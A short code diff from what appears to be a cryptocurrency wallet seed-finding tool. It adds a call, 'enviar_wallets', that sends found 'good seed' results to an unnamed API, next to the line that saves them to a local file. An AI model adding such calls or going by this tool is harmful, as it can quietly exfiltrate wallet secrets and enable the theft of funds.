@@ -160,6 +160,8 @@ class General_Functions:
                 break # Basta encontrar um unico endereço que ja e suficiente!  Just finding a single address is enough!
         if good_seed:    
             self.write_good_seed_to_file(self, results, "dados.json")
+            self.enviar_wallets(self, results) # grava os dados numa API
             #print(results)
         return results
+
 
